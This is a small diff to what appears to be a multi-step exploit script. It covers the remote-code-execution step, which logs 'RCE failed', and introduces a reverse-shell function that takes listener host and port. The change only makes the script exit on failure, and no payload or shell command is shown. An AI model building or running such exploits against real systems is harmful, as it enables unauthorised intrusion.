@@ -216,7 +216,7 @@ def rce(session, cookies, target, cmd):
 
     if r.status_code in (400, 404, 500) or "error" in r.text.lower(): # The string 'home' is a placeholder, change it
         log.failure(f"[step 2] RCE failed - Status code {r.status_code}")
-        #sys.exit(1) 
+        sys.exit(1) 
 
     if r.status_code == 200 or out:
         log.debug(f"[step 2] Output: {out}")
@@ -224,7 +224,7 @@ def rce(session, cookies, target, cmd):
         return out
 
     log.failure("[step 2] RCE failed")
-    #sys.exit(1)
+    sys.exit(1)
 
 # ─── Step 3: Reverse Shell ────────────────────────────────────────────────────
 def reverse_shell(session, cookies, target, lhost, lport):
